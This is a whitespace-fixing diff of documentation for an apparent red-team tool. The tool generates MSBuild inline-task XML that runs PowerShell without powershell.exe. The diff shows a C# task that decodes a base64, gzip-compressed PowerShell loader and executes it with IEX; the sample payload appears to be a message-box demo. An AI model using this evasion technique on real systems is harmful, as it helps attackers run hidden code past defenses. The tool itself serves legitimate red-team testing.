@@ -55,7 +55,7 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     S
             public class hwiJYmWvD : Task {
                 public override bool Execute() {
 
-                    byte[] payload = System.Convert.FromBase64String("JHMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygn    SDRzSUFJOUxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbWZwNmVZM0Z4YW0    1U1RtV3NsWlZQZm1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZV    czNVJickdTcGtLTmduOXBpYTVmYVU2T05TOVhORFpGZXI2cHhjV0o2YWxPK1JWQXM0T    Xo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3    LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb    2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKTs=");
+                    byte[] payload = System.Convert.FromBase64String("JHMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFJOUxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbWZwNmVZM0Z4YW01U1RtV3NsWlZQZm1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZVczNVJickdTcGtLTmduOXBpYTVmYVU2T05TOVhORFpGZXI2cHhjV0o2YWxPK1JWQXM0TXo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKTs=");
                     string decoded = System.Text.Encoding.UTF8.GetString(payload);
 
                     Runspace runspace = RunspaceFactory.CreateRunspace();
@@ -80,10 +80,10 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     S
 **minimized**
     
 ```
-C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     Show-Msgbox.ps1 -m                     
+C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py Show-Msgbox.ps1 -m                     
                                                                                                                   
-        :: Powershell via MSBuild inline-task XML payload generation     script                                       
-        To be used during Red-Team assignments to launch Powershell payloads without     using 'powershell.exe'       
+        :: Powershell via MSBuild inline-task XML payload generation script                                       
+        To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'       
         Mariusz B. / mgeeky, <mb@binary-offensive.com>                                                                
                                                                                                                   
 [?] File not recognized as PE/EXE.                                                                                    
